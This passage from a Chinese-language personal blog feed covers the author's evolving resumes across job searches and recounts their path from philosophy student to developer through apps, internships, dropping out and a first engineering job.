        <content type="html"><![CDATA[<p><img src="/img/resume-evolution-4c337ff30729/1__euypNT0__s38GbehGXhDotQ.jpeg"></p><p>很久以前就想做這個主題了，趁著前一陣子剛修改完履歷，終於可以來動筆。這一篇主要是公開從我第一次找實習一直到最近一次找工作的履歷，跟大家分享我的履歷長什麼樣子。</p><p>其實有些履歷現在看起來真是慘不忍睹，但當下真的覺得自己的履歷還不錯。比起一兩頁的履歷，如果你想更瞭解其他細節，可以參考我之前寫過的：<a href="/2017/10/05/the-programming-journey-1-b9b19c0ef05b/">自學、哲學、講學：我的程式之路（上）</a></p><h3 id="第一版：大一找實習"><a href="#第一版：大一找實習" class="headerlink" title="第一版：大一找實習"></a>第一版：大一找實習</h3><p>雖然唸的是哲學系，但寫程式是從更早以前就培養的專長。那時候因緣際會發現台大有一個新創企業媒合會，雖然覺得自己不夠格，但有朋友勸我去試試看。</p><p>我想說去試試看也行，就花了一兩天整理了一下履歷就過去了。 因為才大一也沒什麼作品，比起履歷，其實更像是簡歷而已，那時候根本不知道履歷怎麼寫。</p><p>所以就用簡短介紹加上條列式的方式，希望能表現出：「我是會寫程式的」這件事情。（那時候為了寫 NPSC 名次還特地回去翻官方網站）</p><p>這時候找的職缺以 Web 跟 App 開發實習生為主。</p><p><img src="/img/resume-evolution-4c337ff30729/1__FAAfk__VzzB2lOqG__qbSAzQ.jpeg"></p><p>這次的結果其實滿順利的，有一間當場就差不多談好了，確定錄取；另外兩家則是之後在額外面試，其中一間面完後幾天通知錄取，我就跟另外一間說我找到實習了不用考慮我了。</p><p>不過也是有現場給履歷之後沒有回音的，而且是我那時候比較想去的公司。</p><h3 id="第二版：正式找工作"><a href="#第二版：正式找工作" class="headerlink" title="第二版：正式找工作"></a>第二版：正式找工作</h3><p>比起第一次的條列式簡歷，第二次求職就是當兵退伍（好啦是結訓，勿戰）之後正式找工作了，利用 104 海投一大堆職缺，也事先找好幾間自己中意的新創公司主動寄信給 HR。</p><p>這次履歷先從上次的簡歷中挑幾項比較重要的，並且補上其他專案經歷跟之前那兩段實習經驗，主要就是說自己有做過哪些東西，證明自己是有實作能力的人。</p><p>除此之外也加了將近一頁的自我介紹，希望能夠讓公司更了解我一點。不過，我也不知道到底有沒有人會看…</p><p>這時候投的職缺是 PHP 工程師跟 Android 工程師兩種，前者居多。</p><p><img src="/img/resume-evolution-4c337ff30729/1__maIYu7iRXzJaTFnfGFzG7w.jpeg"><br><img src="/img/resume-evolution-4c337ff30729/1__ynX6SsicIlcrUwpKXFJ5gA.jpeg"></p><p>會加那段自我介紹的主因是有些優點在履歷上很難表現，例如說有在寫 blog 這件事情。不過現在重看我的履歷，我真是個誠實的人，自我介紹把優缺點介紹的十分詳盡。</p><p>而中間那一段「我會想應徵新創公司…」是因為當初丟的都是新創，直到 104 海投時發現那一段不妥，後來的履歷就都拿掉了。</p><p>一直到這邊為止，我的履歷長相跟其他制式履歷應該都差滿多的。那些自傳或是家人資料我本來就沒有想要填的意思，照片我也從來沒想過要附。學歷那些我覺得也不是重點，直接一行就帶過去了。</p><p>主要是強調專案的經歷跟實習經驗，不過現在回頭看，其實就只有大概講自己有碰過什麼東西而已，沒有進一步量化或是講得更深一點。</p><h3 id="第三版：在職找工作"><a href="#第三版：在職找工作" class="headerlink" title="第三版：在職找工作"></a>第三版：在職找工作</h3><p>在前一間公司工作時，有被書亞集成的徵才文打到一次，覺得不去投投看對不起自己，於是就再改了一次履歷。</p><p>那時的徵才文上面有標明基本需求是打字速度多少多少，所以在履歷上才會標明打字速度，因為這速度顯然超出標準很多 XD</p><p>這時應徵的職缺是前端工程師，因為工作經歷比較沒有接觸到這麼多前端，所以特別加了一段自我介紹，想要試圖幫自己加個分，強調跟前端有關的工作經歷。</p><p>非工作相關經歷那邊條列自己以前跟現在的一些 side project，我自己覺得對工程師來說應該是滿加分的，代表你是認真有在愛寫程式這件事情，而且也有能力完成這些專案。</p><p><img src="/img/resume-evolution-4c337ff30729/1__SOW5YHkXsc36eYXuH__2OfQ.jpeg"></p><p>這版的履歷只有這一次用過，之後就又改了。而這次面試的結果是第一面就被刷掉。</p><p>其實從這次的履歷當中，就可以看出有一點正式履歷的版型了（工作經驗那一段），那整體來說還是沒有那麼正式(?)，不過我也滿喜歡這種感覺的。</p><h3 id="第四版：突如其來的機會"><a href="#第四版：突如其來的機會" class="headerlink" title="第四版：突如其來的機會"></a>第四版：突如其來的機會</h3><p>那時候原本沒有想要求職，但有一個突如其來的機會找上門，只好再改了一次履歷。這版的履歷靈感來源是 CakeResume，那時候第一次用覺得還不錯，版型滿漂亮的，可惜的是輸出的 pdf 檔太大了，好像 10mb 還是多少，對方 HR 問我說能不能提供小一點的。</p><p>因為原本的沒辦法再壓縮，我就按照那個版型自己改一份類似的（或是其實這版是從哪個我忘記的地方拿到的）。</p><p><img src="/img/resume-evolution-4c337ff30729/1__H1hdtr6NCSUcs6obN1qEgQ.jpeg"><br><img src="/img/resume-evolution-4c337ff30729/1__j5lpGGbzgqFEik3qOJDYjQ.jpeg"></p><p>可以注意到這一個時期依舊看得到一點第一版的影子，但已經濃縮成兩三句話了。因為已經有一年多的工作經驗（加上實習四捨五入可以算兩年嗎），重點放在工作上到底做了哪些事情，造成哪些影響。</p><p>而其他專案的部分只挑幾個重要的列，之前國中高中做的那些小專案都沒有再提過了。也試圖把那些專案在做的事情描述得更清楚一點。</p><p>這一版跟上一版的最大差別就在於工作內容的描述，上一版講得十分含糊，這一版很明確地列出解決了哪些問題，用了哪些技術。而面試的時候面試官也有針對這點下去問，例如說 Android SDK 熱更新的細節，用了哪些 API 等等。</p><p>最後有成功拿到 Offer。</p><h3 id="第五版：英文履歷初體驗"><a href="#第五版：英文履歷初體驗" class="headerlink" title="第五版：英文履歷初體驗"></a>第五版：英文履歷初體驗</h3><p>第五版，也是現在最新的版本。這次為了要找新加坡的工作，履歷必須是全英文的。因此就是整個一次做了大翻新，跟之前的履歷完全不一樣。</p><p>因為線上可以找到的版型我都不喜歡，覺得浪費太多空間或者重點不是放在我想要的地方，因此找了我朋友拿了他的履歷版型，覺得很不錯。</p><p>一開始其實是先寫中文，接著再改成英文。因為如果不這樣寫，我會想不到應該要寫什麼。在寫這個履歷之前，其實 Linkedin 上面的 Profile 就已經是英文了，所以有很多部分都直接從上面抄下來改一改。</p><p>建議大家有事沒事就維護一下 Linkedin，等到真的要寫履歷的時候你絕對會感謝以前的自己。</p><p><img src="/img/resume-evolution-4c337ff30729/1__BeDIpFAGR4LF7UDhTRlQiA.jpeg"></p><p>這次的履歷看起來比較正式，但我覺得也更簡潔了一些，而且重點很明確。直接從工作經歷切入，沿襲了第四版履歷重點條列的寫法，明確寫出自己到底做了哪些事情，可以量化的就量化，提到產品相關數字也行。這份也有請強者我朋友幫我稍微改過。</p><p>另外一個同樣重要的是 Others 那部份的 side project，這一直都是我自認履歷上的強項，所以篇幅也佔很大，主要就是講自己做了哪些事情，稍微簡介一下。部落格的部分則是有特別強調寫了哪些相關文章。</p><p>最不重要的學歷就留在最後，一樣只有一行而已。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>這一篇算是幫自己做了一次履歷回顧，我覺得比起履歷教學什麼的，有時候這樣的回顧會更有用一點。因為你可以很明確地看出從第 n 版到第 n+1 版做了哪些改動，或是版型上的更換。</p><p>有前一版可以對照之後，就能夠知道這一版的履歷是不是真的有比較好以及哪邊比較好等等的。</p><p>第五版，也就是最新版的履歷我還滿滿意的啦，之後沒意外的話會沿用那個版型繼續下去，不過下次找工作也不知道是何時了。</p><p>最後是不是應該來個 call to action。喜歡的話按個鼓掌或幫我分享一下，如果覺得這樣的文章很有趣，也可以試著分享自己的履歷進化史，一定會是有趣的體驗。</p><p>如果你對履歷修改有什麼心得，或是看我的履歷覺得有地方可以再改進的話，也歡迎留言在下面，感謝感謝。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自學、哲學、講學：我的程式之路（下）</title>
      <link href="/2017/10/06/the-programming-journey-3-ebd9e995a4eb/"/>
      <url>/2017/10/06/the-programming-journey-3-ebd9e995a4eb/</url>
      
        <content type="html"><![CDATA[<p>此篇為系列文章的最後一篇，如果你錯過前兩篇，傳送門在這：</p><p><a href="/2017/10/05/the-programming-journey-1-b9b19c0ef05b/">自學、哲學、講學：我的程式之路（上）</a><br><a href="/2017/10/05/the-programming-journey-2-98dea8c475ae/">自學、哲學、講學：我的程式之路（中）</a></p><h3 id="會寫程式的文組生"><a href="#會寫程式的文組生" class="headerlink" title="會寫程式的文組生"></a>會寫程式的文組生</h3><p>每當有人知道我是念哲學系的時候，就會問我說：「咦，那為什麼你會寫程式？」，我都會跟他們說：「你搞錯順序了，我是先學會寫程式，才念哲學系的。」</p><p>接著一定會問我，我在上一篇裡面回答的問題：「那你怎麼會來念哲學系？」</p><p>哲學這個詞之所以能被放在標題裡，當然也代表他在我的成長歷程中佔了一定的份量，短短兩年不到的哲學系時光，教授講過一句令我印象深刻的話（原句一定不是這樣，但大意類似）：</p><blockquote><p>很多人都以為哲學把東西弄複雜了，但其實不是的，哲學其實是把複雜的東西變簡單。</p></blockquote><p>這句話改變了我對哲學的想法。我以前也以為哲學是把東西變複雜，怎麼一堆名詞然後一堆理論，為什麼要把想法變得那麼複雜？後來我才知道，原來這就是理論，這就是學說，這就是整理。</p><p>如果你不念哲學系，當然也可以思考那些哲學問題，也可以思考自由意志與決定論，可以思考電車問題到底要不要按下按鈕。可是會碰到一個問題，那就是有時候你自以為你懂了，但其實卻沒有。</p><p>如果你有念哲學，哲學就會跟你說：「喔，你的這個想法其實在哲學的領域叫做強決定論，幾百年前的某某人也曾經跟你一樣有相同的看法，但是這個學說其實會碰到什麼什麼問題」</p><p>哲學這套體系把那些極為發散的想法收斂起來，變成一個個專有名詞，如果沒有這樣做整理，在與別人討論對話的時候只會雞同鴨講，有時候你自以為想出一個極為創新的理論，念了哲學才發現幾百年前柏拉圖就已經提出過這樣的概念了。</p><p>知道你自己的這個想法其實早就被提出有什麼好處？好處就是以前的人碰到的問題，你也會碰到。每一個哲學理論都會碰到一些必須要解決的問題，如果你成功解開了以前人解不開的，你就可以延伸出這套哲學發展出自己的理論。</p><p>念了哲學系之後，你去看一個問題會去關注它的前提以及論證，你會知道說：「要相信一件事情是真的，必須要有一個好理由」，「好理由」是我很喜歡的一個單字。你要做什麼決定都可以，但重點是這個決定背後必須要有一個「好理由」支持你去做這個決定。</p><p>常常有人會戰說哲學到底有沒有用，我認為哲學有用極了。它讓我多了一種看事情的角度以及思考問題的方法，這些都是非常受用的。如果你念了哲學系卻怕找不到工作，沒關係，我已經決定了。以後<a href="https://lidemy.teachable.com/">Lidemy 鋰學院</a>的線上課程，附上哲學系學生證，只要能證明你是或曾經是哲學系學生，所有課程一律給折扣（至於折扣多少，我還要再想一下…）。</p><h3 id="與-Android-App-再續前緣"><a href="#與-Android-App-再續前緣" class="headerlink" title="與 Android App  再續前緣"></a>與 Android App  再續前緣</h3><p>還記得我前面說過學會寫 Android App 對我之後發生的事情有影響嗎？這個要結合之前與補習班的故事。在我大一的時候，高中的補習班主任問我說：「你是不是會寫 App？那來做個 App 版的學測落點分析吧！」，他事後說那時候只是說說，沒有想到我會真的做出來。</p><p>但總之我就是做出來了，那是全台灣第一個在做落點分析的 Android App。為了增加曝光度，主任還找了一些媒體來採訪，而我身上最有新聞點的當然就是：哲學系學生。</p><p><img src="/img/the-programming-journey-3-ebd9e995a4eb/0__ZcyM0vQylz__vvKnY.jpg"><br><img src="/img/the-programming-journey-3-ebd9e995a4eb/0__lGJShJw0DZROBjwh.jpg"></p><p>現在在網路上都還搜尋的到當年的報導：<a href="http://news.ltn.com.tw/news/life/paper/650090">首個學測落點 App 台大哲學系學生研發的</a>、<a href="http://www.appledaily.com.tw/appledaily/article/headline/20130128/34798688/">台大生研發 免費學測落點 App</a>，甚至連台大校訊都有：<a href="https://host.cc.ntu.edu.tw/sec/schinfo/epaper/article.asp?num=1125&sn=11409">哲學一胡立開發推甄申請落點分析 APP 廣獲網友好評</a>。</p><p>這次經歷算是滿特別的，第一次上報紙，第一次登上網路新聞也第一次被採訪。但其實新聞熱潮過了之後也沒什麼感覺，頂多就是親朋好友都會知道：「你就是那個寫落點分析 App 的人喔！」。</p><p>這個 App 實作起來雖然不難，但是對技術能力其實也有一定的成長，這是我第一個這麼完整的 App，而且有實際上架到 Google Play。除了 Android 版以外，還有 iOS 版，所以 iOS 的開發者申請流程以及上架流程我也都完整跑過一遍。那時候我本來是想要學 Objective C，買了幾本書之後發現語法長得好怪，讓我很抗拒，之後就乾脆不學了。</p><p>不想學 iOS 開發可是又一定要有 iOS 版，怎麼辦呢？那時候我就朝向跨平台解決方案來看，例如說用網頁寫 App 的 Phonegap，但發現效能好像不太好，之後我又找到一套叫做 Titanium SDK 可以跨平台，但因為 Android 的版本我已經用 Java 寫了，所以我就拿這一套只做 iOS 的版本。</p><p>會這麼喜歡 Titanium SDK，是因為他的開發效率極快。我大概花了三四天左右，就把 Android App 整個移植到 iOS 上面了。</p><p><img src="/img/the-programming-journey-3-ebd9e995a4eb/0__RLjoydXBx9bPWC3t.jpg"></p><p>這個專案讓我學到了 Android 開發、Titanium SDK 來進行 iOS 開發以及 Google Play 與 iOS 的開發者帳號申請跟上架流程，等於是一個人就完成了雙平台的 App 開發。</p><p>而且這個 App 在市場上也拿下了不錯的成績。</p><p>Apple Store 最高名次：全部 29 名（2014&#x2F;2&#x2F;14）、教育類第 1 名（2014&#x2F;2&#x2F;14）<br> Google Play 最高名次：教育類第 2 名（2013&#x2F;2&#x2F;24）。</p><h3 id="靠解決自己的問題練功：今晚九點電影"><a href="#靠解決自己的問題練功：今晚九點電影" class="headerlink" title="靠解決自己的問題練功：今晚九點電影"></a>靠解決自己的問題練功：今晚九點電影</h3><p>但其實在開發落點分析 App 之前，我還做過另外一個 App，叫做今晚九點電影。靈感來源是 ptt 電影版上面每週五都會有熱心的網友 po 這個週末的電視台會播什麼電影。身為一個電視兒童，覺得這樣的功能實在是太實用了，於是就自己寫一個。</p><p>我去 prase 開眼電影網的電視時刻表，後端一開始是用 Java 寫的，因為要把它放到 Google App Engine 上面。App 這邊當然就是用 Java 直接寫 Native 的 Android 了。</p><p>這是我第一個前後端都自己一手包辦的作品，甚至連 Logo 也是自己畫的。</p><p><img src="/img/the-programming-journey-3-ebd9e995a4eb/0__yAVOfwoGh__MtILEx.jpg"></p><p>上面這兩個 App 奠定了我在 App 開發上的基礎，知道自己有能力打造出一個功能完整的手機程式，也有能力把它上架到商店上面。</p><h3 id="離職場更進一步：實習"><a href="#離職場更進一步：實習" class="headerlink" title="離職場更進一步：實習"></a>離職場更進一步：實習</h3><p>在大一的時候，偶然間得知了學校有辦一個叫做新創企業媒合會的活動，會有很多新創公司在那邊找實習生。抱著試試看的心情，我就去那邊參加了。其實從進大學以前就一直很想出去工作了，但一直苦無機會。很多中小企業或大公司可能看到你還是個高中，或你是一個哲學系學生就不理你了，但新創公司通常比較自由開放，並且以能力至上。</p><p><a href="https://docs.google.com/document/d/13thPmhdu7ZAdv_nnFiLNCwt1QsQyPucwmug9UEywvvQ/edit?usp=sharing">這是我</a>那時候帶去的簡歷，上面寫的其實我在這篇文章幾乎都有提到了，主要就是過去的作品跟比賽的經歷。</p><p>在去之前，我有先在網路上查好有哪幾家是我有興趣的，結果一到現場去之後，我有興趣的第一家直接問我什麼時候可以來實習，也就是當場錄取的意思。於是稍微敲好時間說之後再聯絡以後，我就回家了，剩下幾間有興趣的我都沒去。</p><p>我的第一個實習是一間新創的遊戲公司，大概才六七個人而已，但很可惜的，那時候因為比較忙的緣故，每週去一次，大概去了四五次之後我就沒有再去了。還在遊戲規劃的階段實習就結束了，一點程式碼都沒有碰到。這段經歷帶給我的啟示就是：要實習的話，就要全心全意實習。</p><p>相隔一年，大二的時候我再度去了新創媒合會，這次我把有興趣的都談過一輪，之後也陸陸續續補了幾次面試，最後選定了兩間作為我實習的公司。為什麼是兩間呢？因為其中一間要求一個禮拜去兩天，另外一個要求一個禮拜工作時數約 15 小時。我仔細想了想，只要我假日或是平日晚上也在工作的話，是可以兩邊同時進行的。</p><p>在提到這兩間到底在做什麼以前，必須先提到另外一件事情。那就是大二下開學後的一個月，我就休學了。</p><h3 id="踏入休學者聯盟"><a href="#踏入休學者聯盟" class="headerlink" title="踏入休學者聯盟"></a>踏入休學者聯盟</h3><p>在要休學的時候，家人一開始是有點反對的。但在經過我的不斷說服跟知道儘管他們不同意我還是會休學之後，他們就同意了。我那時候有寫一封信給他們，說明我休學的理由跟想法，我這邊直接貼上來，省得還要再打一次：</p><blockquote><p><em>給最親愛的家人們：</em></p></blockquote><blockquote><p><em>我要休學了。聽到這個消息的時候想必大家都很震驚，也很關心 「怎麼會突然有這樣的決定？」，但是其實這個決定並不突然</em></p></blockquote><blockquote><p><em>大一上、大一下、大二上，我都已經想過休學這個問題，只是沒有提起</em></p></blockquote><blockquote><p><em>從國中開始，我就想出去工作了。 那是當我發覺，我對程式設計真的很有熱情的時候，但我最後還是接受了主流的道路，考了高中，接著繼續念大學 然而，想工作的這種心情一直沒有消失，一直沒有，這也是為什麼我會想去實習的原因</em></p></blockquote><blockquote><p><em>而我會選擇半念書半實習，還有一個原因就是：我沒有勇氣休學，所以只能妥協於這樣的方式</em></p></blockquote><blockquote><p><em>如果我終於無法忽視心中的那股聲音，才做出了這樣的決定，與其說突然，不如說早已醞釀許久<br>  今天大家都提供給我很多意見、很多看法，而你們講的那些，我其實或多或少都已經想過了</em></p></blockquote><blockquote><p><em>先來說說我的計畫吧！ 現在休學以後，認真的把實習的工作做好，到八月底結束 如果情況順利，那我就去當兵，然後就找工作進入職場，不復學了；如果情況不順利，那我就會乖乖復學，等於是休學半年再回來 （或是先當完兵，再復學，這還要再看看） 有些人問說，那為什麼不按照現今的步調，一邊念書一邊實習呢？ 第一點是，我厭倦了念書的生活，作業、報告、期中、期末，絕對都會花費掉許多時間，更何況念的還是沒有很大興趣的科目。</em></p></blockquote><blockquote><p><em>第二點是，繼續念書只是為了拿到台大學歷。</em></p></blockquote><blockquote><p><em>你們每一個人都有跟我提過，學歷在職場上的重要性。我懂，我有在聽 但是我不信，我還是寧願相信能力比學歷重要，就像你們也深深相信學歷很重要一樣</em></p></blockquote><blockquote><p><em>我不否認有很多大公司，學歷是門檻，沒有學歷就進不去，但是我的夢不在大公司，而比較想去一些小公司</em></p></blockquote><blockquote><p><em>賺大錢，一個月拿很多薪水也不是我想要的，所以大公司對我沒有吸引力 而一些新創企業，就我自己的經驗看來，能力會比學歷重要 畢竟學歷比較重要的話，那幹嘛用台大哲學的我，而不用台大資工的？</em></p></blockquote><blockquote><p><em>待在新創公司，薪水或許無法拿的很多，但至少是做自己喜歡的事，是開心的，讓自己過的開心，是我覺得最重要的事</em></p></blockquote><blockquote><p><em>我的人生目標之一，就是要去證明能力比學歷重要這件事情 我要用我自己的經驗，去證明給大家看</em></p></blockquote><blockquote><p><em>那如果失敗了怎麼辦？</em></p></blockquote><blockquote><p><em>我知道你們自己苦過，經歷過，所以才不想讓我也一樣苦。想讓我走一條最舒適的路，能夠碰到比較少的困難 但如果我接受了，我的人生過的很輕鬆，那碰到困難的時候怎麼辦？我有能力可以擔的起來嗎？</em></p></blockquote><blockquote><p><em>不讓孩子跌倒過，以後哪天他跌到了，就不知道怎麼爬起來</em></p></blockquote><blockquote><p><em>我不怕困難，我也不怕失敗 因為我知道如果哪天我真的苦到撐不下去，你們會拉我一把</em></p></blockquote><blockquote><p><em>我認為，那才是家人應該在的位子，讓孩子知道你永遠是他的後盾，要放手讓孩子出去，他才會知道現實</em></p></blockquote><blockquote><p><em>如果我沒有吃過檸檬，而你一直說他很酸，但我卻永遠體驗不到酸的感覺 社會很現實，我知道，但我仍然想自己出去闖蕩，儘管跌跌撞撞也無所謂</em></p></blockquote><blockquote><p><em>自己遭受到困難之後，才會真正了解到你們所說的現實，才能繼續成長，而不是像個孩子只能照著規劃好的路線走</em></p></blockquote><blockquote><p><em>我認同你們想讓我人生過的更順遂的想法，但順遂的路卻不是我想走的 我想自己出去看看，用自己的能力工作，自己去體驗這個社會的現實</em></p></blockquote><blockquote><p><em>或許我休學以後，可能真的體驗到「阿！原來學歷真的很重要」，那我就會乖乖的回去念大學</em></p></blockquote><blockquote><p><em>這個時候，或許已經「浪費」了幾年 但是，那幾年真的有浪費掉嗎？我體驗到了學歷的重要、社會的現實</em></p></blockquote><blockquote><p><em>我「親身」去體驗過了，我相信這些經驗都是十分寶貴的</em></p></blockquote><blockquote><p><em>所以我覺得那幾年，一點都不浪費 或許那個時候我已經 22 歲，但我一點都不怕，因為我年輕，我相信年輕是我的優勢 如果年輕就害怕失敗，綁手綁腳的，那怎麼能成長？</em></p></blockquote><blockquote><p><em>如果不趁年輕的時候闖蕩，以後就沒有機會了</em></p></blockquote><blockquote><p><em>到了 30 歲，或許我要開始養家，於是有了包袱，有了不能失敗的壓力<br>  到那個時候，我才會覺得失敗是一件會令人害怕的事</em></p></blockquote><blockquote><p><em>但是我現在，才 20 歲而已 或許有人會覺得，那至少先把大二下念完吧！</em></p></blockquote><blockquote><p><em>這點我也考慮過，但是我一點都不想</em></p></blockquote><blockquote><p><em>你們的想法是「只剩」半年，但我是想「還有」半年 我已經等了一年半，才做出這個決定，為什麼還要等半年？ 有些事情，現在不做，以後就沒有勇氣作了</em></p></blockquote><blockquote><p><em>我不否認有些事情的確要有一絲絲的衝動，但休學這個決定我還是考慮過許久</em></p></blockquote><blockquote><p><em>如果我還要念半年，那就代表我還要欺騙我自己半年。欺騙我自己，學歷對我很重要，台大對我很重要<br>但這兩件事是我打從心底不相信的，不相信的程度，就跟你們相信的程度一樣</em></p></blockquote><blockquote><p><em>我是真的想休學 我考慮過了，也有把退路想好（復學）</em></p></blockquote><blockquote><p><em>只是復學問題跟兵役問題我還要詳細去問過以後，才能真正決定</em></p></blockquote><blockquote><p><em>我不怕失敗，不怕挫折 我只怕自己沒有跨出去的勇氣，沒有接受失敗的勇氣 我不怕以後薪水低，我不怕以後工作難找，我不怕學歷真的很重要 我只怕自己沒有用自己的力量去努力證明自己相信的事</em></p></blockquote><blockquote><p><em>我只怕自己太輕易妥協，失去了自己的信念</em></p></blockquote><blockquote><p><em>休學，或許不是對我人生最好的決定，或許也不是對我未來最成功的決定<br>但我敢保證，一定是最勇敢的決定</em></p></blockquote><blockquote><p><em>也是最誠實的決定</em></p></blockquote><blockquote><p><em>胡立 上</em></p></blockquote><p>上面應該把該講的都講完了，休學這一塊我就不再多做描述了。</p><p>休學完之後，當然就是專心在剛剛講的那兩間公司實習囉。現在可以來講一下他們都在做什麼了。</p><h3 id="QLL"><a href="#QLL" class="headerlink" title="QLL"></a>QLL</h3><p>第一間叫做 QLL，一開始是做一些跟兒童教育相關的 App，有出了很多有聲書 App。去那邊負責的事情是寫一個 App，這個 App 基本上是由他們提出來，我們再一起討論過後決定要做哪些功能。</p><p>比較特別的點是他們的 App 是用 Corona SDK 開發的，也是標榜寫一次就可以在兩個平台上面跑。使用的的程式語言是 Lua，酷吧！</p><p>最後的成品長這樣：（我大概做到七八成就結束實習了，另外兩三成由後續接手的人補齊）</p><p><img src="/img/the-programming-journey-3-ebd9e995a4eb/0__0AHgIYfvMBWruzgD.jpg"><br><img src="/img/the-programming-journey-3-ebd9e995a4eb/0__Ka4ixVH51WKwEi9P.jpg"></p><h3 id="Traiwan"><a href="#Traiwan" class="headerlink" title="Traiwan"></a>Traiwan</h3><p>另外一段實習是在一間做民宿管理系統與線上訂房的公司，在這邊可以讓我真的接觸到產品，終於能夠做到公司員工在做的事。主要內容其實就是前端部分改改頁面，用 jQuery 提供一些功能，後端則是 PHP 增加新功能，資料庫用的是 MySQL。</p><p>在這間公司真的學到很多。因為實習生不只我一個，所以要跟其他成員協作。而那邊的老闆也滿注重程式的規範跟結構，會跟你討論應該要怎麼寫會比較好。因為是旅遊產業，所以也跟一些旅遊網站串接 API，看到 API 文檔是長什麼樣子。</p><p>他們現在網頁已經大改版了，所以介面跟以前不一樣，但功能還是差不多的：</p><p><img src="/img/the-programming-journey-3-ebd9e995a4eb/0__NY9UogQ0QKbIvGjz.jpg"></p><p>在這間公司也實習了半年，對我的幫助有三個。</p><p>第一個是提升對 PHP、MySQL 以及 jQuery 的理解度跟熟練程度，在這邊做了很多功能所以累積了滿多經驗。</p><p>第二個是學到「取捨」。舉一個小例子好了，程式設計師看到某地方的程式碼寫得很爛就會想改掉，或者是看到系統很爛就會想砍掉重練，這些其實都可以做，但重點是「資源有限」，對公司來說，到底什麼事情才是最重要的？維持現狀的話，你可以去串接新的廠商的 API，為公司開通一個渠道。</p><p>決定砍掉重練的話，可以減少以後要還的技術債，可是在這兩週內對公司的營收不會有任何實質上的幫助。尤其是在資源十分有限的新創公司，這樣子的取捨更顯得重要。有可能一個錯誤決定，就把整個公司帶向死亡。</p><p>這讓我理解到有時候不是程式的問題，而是資源的問題，重點在於資源應該怎麼分配才會更合理。</p><p>第三個是對於新創公司的嚮往。還記得那年暑假因為公司要到花蓮拓展，把整個公司包含實習生大約十個人一起拉下去花蓮，在那邊租一間三房兩廳的屋子，在那邊生活，也在那邊工作。</p><p>早上起床輪流出去買早餐，吃完早餐之後直接在餐桌上拿出筆電開始工作，工作到中午出去買便當或者是叫外賣，晚上工作結束之後大家一起去海邊走走或者是去逛逛夜市。全部人都生活在同一個屋簷下。</p><p>這時期是我對新創最難忘的一段，因為這樣子的生活實在是太有那種「新創公司的早期刻苦生活」的感覺，好像每一個人都願意為了公司付出所有，願意把工作跟生活混合在一起，齊心協力向著目標走去。這樣子的感覺我很喜歡，覺得這樣能有共患難的革命情感。</p><p>當初跟這兩間公司談實習的時候，期間都是半年，一直都八九月的時候正式結束。接著我就按照原定計劃等當兵，退伍之後出來找工作。</p><h3 id="終於踏入職場：第一次求職"><a href="#終於踏入職場：第一次求職" class="headerlink" title="終於踏入職場：第一次求職"></a>終於踏入職場：第一次求職</h3><p>我原本就有持續在搜集一些理想公司的清單，其實我原本只打算投那些公司的，可是後來我心念一轉：「既然是第一次找工作，那不如累積多一點經驗吧！」，於是我就打開 104，任何系統推薦我的公司我都按「應徵」。</p><p>那時期詳細的面試心得我有寫在<a href="https://www.ptt.cc/bbs/Soft_Job/M.1431190145.A.D28.html">ptt</a>上面了，一共面試了十五間公司。而這些經歷也對我滿有幫助的啦，至少讓我知道面試的流程以及面試的必考題大概會是什麼。</p><p>不過，幸好我有這樣投。因為我原先的那些理想公司清單，只有一間有理我，其他間連面試的機會都不給。而唯一那間面試過之後也沒有錄取。</p><p>面試結束之後必須要做好心理調適，自信心一直是我覺得很重要的一項人格特質，若是太高容易變成自我感覺良好，太低容易小看自己。我自己是中間偏低，界線到底在哪邊一直到現在我都還是拿捏不準。</p><p>但以我那時候來說，我覺得我的程式能力以社會新鮮人的標準來說應該也是挺不錯的吧！要求的薪資也沒有很高，有些甚至直接寫「依公司規定」，為什麼還是這麼多公司拒絕我？</p><p>後來我用兩個理由說服自己：</p><ol><li>不是你不夠強，只是跟這間公司不適合而已</li><li>公司低估你，這是那些公司的損失</li></ol><p>但我還是有拿到三四間公司的 offer，最後去了一間辦公室很漂亮，離家很近，做的事情也是我有興趣的公司。</p><h3 id="初試啼聲"><a href="#初試啼聲" class="headerlink" title="初試啼聲"></a>初試啼聲</h3><p>我正式工作的第一間公司很有新創的感覺，光是<a href="http://www.netappstore.net/place.html">辦公室</a>就很像新創公司了。</p><p>在程式上面主管也是給予我十足的自由，願意讓我花時間去學習 Node.js 並且應用到專案上面。在這間公司其實我做的事情滿多的，從前端 React + Redux 到後端 Node.js + Express，MySQL, MongoDB 跟 Redis 也有碰過，再到 Android 這端維護公司跟其他遊戲廠商串接的 SDK，前後端甚至移動端我全包了。</p><p>但其實在這邊學到最多的不是上面這些，而是對主機與架構的理解度。我在進去這間公司以前，是沒有用過 ssh 的，也沒用過 nginx，都只是聽過但不知道是什麼東西，是來這邊之後才知道 nginx 有多厲害。</p><p>在這之前對後端架構也是一竅不通，什麼 Load balance，什麼 NAT，什麼異地備援或是 DB Replication 我聽都沒聽過，是來這邊之後才慢慢學到這些的，也學到 AWS 的使用方法。對伺服器架構的理解程度瞬間提升了一個檔次，從完全不懂到能夠理解基礎。</p><p>在這裡我用程式解決了很多問題，也學習到一些新的用法跟技術。在這間公司待了一年多，我覺得成長了許多。如果你想知道我到底實際學會哪些東西，可以參考：<a href="http://huli.logdown.com/posts/926762-redis-introduction">資料庫的好夥伴：Redis</a>、<a href="http://huli.logdown.com/posts/926745-fast-restful-nodejs-api-backend">用 Node.js 快速打造 RESTful API</a>、<a href="http://huli.logdown.com/posts/774229-the-battle-against-ddos-nginx-iptables-and-fail2ban">[心得] 與 DDoS 奮戰：nginx, iptables 與 fail2ban</a>、<a href="http://huli.logdown.com/posts/661513-android-apk-decompile">[Android] 人人都會的 apk 反編譯</a>、<a href="http://huli.logdown.com/posts/542398-high-connection-setting">[心得] 高併發伺服器設定</a>、<a href="http://huli.logdown.com/posts/283288-android-getting-started-with-apache-thrift">[Android] apache thrift 入門與 android 上的實作</a>。</p><p>除了這些以外，還有一件事情要特別提起，那就是在這間公司主動開設的內部課程。</p><h3 id="教學的開始"><a href="#教學的開始" class="headerlink" title="教學的開始"></a>教學的開始</h3><p>當初跟一個同事在公司內一起開了 JavaScript 